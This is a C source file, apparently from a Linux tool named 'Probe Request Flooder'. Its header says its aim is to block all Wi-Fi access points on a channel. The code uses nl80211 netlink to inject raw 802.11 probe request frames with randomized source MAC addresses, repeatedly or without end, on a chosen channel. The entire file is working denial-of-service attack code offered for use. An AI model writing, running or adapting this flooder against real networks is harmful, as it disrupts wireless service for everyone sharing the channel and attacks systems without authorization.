/**
 * Probe Request Flooder
 * A tool to generate a flood of probe requests on a given channel.
 * It will block all APs on the channel with heavy IO.
 *
 * LICENSE: DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE
 *
 * Author: Li Shijian
 * Date: 18 Sep 2012
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdarg.h>
#include <time.h>
#include <net/if.h>
#include <netlink/genl/genl.h>
#include <netlink/genl/family.h>
#include <netlink/genl/ctrl.h>

#include "nl80211_copy.h"
#include "flooder.h"

int debug_level;

static uint32_t port_bitmap[32] = {0};
static int handle_id;


static void handle_destroy(struct nl_handle *handle){
  uint32_t port = nl_socket_get_local_port(handle);
  
  port >>= 22;
  port_bitmap[port / 32] &= ~(1 << (port % 32));
  
  nl_handle_destroy(handle);

}

static struct nl_handle *gen_handle(struct nl_cb* cb){
  struct nl_handle *handle;
  uint32_t pid = getpid() & 0x3FFFFF;
  int i;
  
  handle = nl_handle_alloc_cb(cb);
  
  for (i = 0; i < 1024; i++) {
    if (port_bitmap[i / 32] & (1 << (i % 32)))
      continue;
    port_bitmap[i / 32] |= 1 << (i % 32);
    pid += i << 22;
    break;
  }
  
  nl_socket_set_local_port(handle, pid);
  
  if (!handle){
    flooder_log(FLOODER_DEBUG, "Failed to allocate a handle");
    return handle;
  }
  
  if(genl_connect(handle)){
    flooder_log(FLOODER_DEBUG, "Cannot connect to handle");
    handle_destroy(handle);
    return NULL;
  }  

  if ((handle_id = genl_ctrl_resolve(handle, "nl80211")) < 0){
    flooder_log(FLOODER_DEBUG, "Cannot resolve nl80211");
    handle_destroy(handle);
    return NULL;
  }

  return handle;
}

static struct nl_cb *gen_cb(){
  struct nl_cb *ret = nl_cb_alloc(NL_CB_DEFAULT);
  if(!ret)
    flooder_log(FLOODER_DEBUG, "Failed to allocate a callback");
  return ret;
}

static unsigned getFreq(int channel){
  return 2407 + channel * 5;
}

static void shuffle_src(u8 *src){
  int i;
  for (i = 0; i < ETH_ALEN; ++i)
    src[i] = rand() % 256;
  
}

static u8* gen_buf(size_t *size){

  static const u8 template[] = {
    0x40, 0x00, 0x00, 0x00, 0xff, 0xff, 
    0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
    0x00, 0x00, 0x00, 0x00, 0x01, 0x08, 0x02, 0x04,
    0x0b, 0x16, 0x0c, 0x12, 0x18, 0x24, 0x32, 0x04,
    0x30, 0x48, 0x60, 0x6c, 0x03, 0x01, 0x0b, 0x2d,
    0x1a, 0xce, 0x11, 0x1b, 0xff, 0xff, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00};

  static const int src_offset = 10;

  u8* ret = (u8 *)malloc(sizeof(template));
  
  if (ret == NULL)
    return NULL;
  
  *size = sizeof(template);

  memcpy(ret, template, *size);
  shuffle_src(ret+src_offset);

  return ret;
}

static struct nl_msg *gen_msg(flooder_param *params){
  //  struct nl_msg *msg, *ssids, *freqs;
  
  struct nl_msg *msg  = nlmsg_alloc();
  if (!msg){
    flooder_log(FLOODER_DEBUG, "Failed to allocate a netlink message");
    return NULL;
  }
  
  
  
  /*
  ssids = nlmsg_alloc();
  freqs = nlmsg_alloc();

  if (!msg || !ssids || !freqs){
    flooder_log(FLOODER_DEBUG, "Failed to allocate a netlink message");
    if(msg)
      nlmsg_free(msg);
    if(ssids)
      nlmsg_free(ssids);
    if(freqs)
      nlmsg_free(freqs);
    return NULL;
  }

  genlmsg_put(msg, 0, 0, handle_id, 0, 0, NL80211_CMD_TRIGGER_SCAN, 0);
  NLA_PUT_U32(msg, NL80211_ATTR_IFINDEX, params->iface);

  NLA_PUT(ssids, 1, 0, "= =");
  nla_put_nested(msg, NL80211_ATTR_SCAN_SSIDS, ssids);

  NLA_PUT_U32(freqs, 1, getFreq(params->channel));
  nla_put_nested(msg, NL80211_ATTR_SCAN_FREQUENCIES, freqs);
  */

  size_t buf_len;
  u8* buf = gen_buf(&buf_len);
  if (buf == NULL)
    goto nla_put_failure;
  
  genlmsg_put(msg, 0, 0, handle_id, 0, 0, NL80211_CMD_FRAME, 0);
  NLA_PUT_U32(msg, NL80211_ATTR_IFINDEX, params->iface);
  NLA_PUT_U32(msg, NL80211_ATTR_WIPHY_FREQ, getFreq(params->channel));
  NLA_PUT_FLAG(msg, NL80211_ATTR_DONT_WAIT_FOR_ACK);
  NLA_PUT(msg, NL80211_ATTR_FRAME, buf_len, buf);
  free(buf);
  return msg;

 nla_put_failure:
  nlmsg_free(msg);
  return NULL;
}

static int ack_handler(struct nl_msg *msg, void *arg){
  int *err = arg;
  *err = 0;
  return NL_STOP;
}

static int finish_handler(struct nl_msg *msg, void *arg){
  int *ret = arg;
  *ret = 0;
  return NL_SKIP;
}

static int error_handler(struct sockaddr_nl *nla, struct nlmsgerr *err, void *arg){
  int *ret = arg;
  *ret = err->error;
  return NL_SKIP;
}

static int send_and_recv(struct nl_handle* handle, struct nl_msg* msg, struct nl_cb* cb){
  int err = -1;
  struct nl_cb *tmp_cb;
  tmp_cb = nl_cb_clone(cb);
  if (!cb)
    goto out;
  
  err = nl_send_auto_complete(handle, msg);
  if (err < 0)
    goto out;

  err = 1;

  nl_cb_err(tmp_cb, NL_CB_CUSTOM, error_handler, &err);
  nl_cb_set(tmp_cb, NL_CB_FINISH, NL_CB_CUSTOM, finish_handler, &err);
  nl_cb_set(tmp_cb, NL_CB_ACK, NL_CB_CUSTOM, ack_handler, &err);

  while(err > 0)
    nl_recvmsgs(handle, tmp_cb);
  
  out:
  nlmsg_free(msg);
  nl_cb_put(tmp_cb);
  return err;
}

static void send_one_probe_request(struct nl_handle* handle, flooder_param *params, struct nl_cb* cb){
  flooder_log(FLOODER_DEBUG, "Send One Probe Request");
  int ret;
  struct nl_msg* msg;

  #define DEVICE_BUSY -16
  do{
    msg = gen_msg(params);
    ret = send_and_recv(handle, msg, cb);
  }while(ret == DEVICE_BUSY);

  if (ret)
    flooder_log(FLOODER_DEBUG, "Sending Failed because %s", strerror(-ret));
  else
    flooder_log(FLOODER_DEBUG, "Sending Finished");
}

int probe_req_flood(flooder_param *params){
  srand(time(NULL));
  struct nl_cb *cb = gen_cb();
  struct nl_handle *handle = gen_handle(cb);
  if (cb == NULL || handle == NULL)
    return -1;
  
  int i = 0;
  while(params->times == -1 || i < params->times){
    send_one_probe_request(handle, params, cb);
    i++;
    if (i % 10 == 0)
      flooder_log(FLOODER_INFO, "Flood the %d times", i);
  }
  flooder_log(FLOODER_INFO, "Flood Finished!");
  handle_destroy(handle);  
  
  return 0;
}

void flooder_log(int level, const char*fmt, ...){
  static char* level_map[] = {
    "[DUMP]    ",
    "[DEBUG]   ",
    "[INFO]    ",
    "[WARN]    ",
    "[ERROR]   "
  };

  va_list ap;
  va_start(ap, fmt);
  if (level >= debug_level){
    printf(level_map[level]);
    vprintf(fmt, ap);
    printf("\n");
  }
  va_end(ap);
}
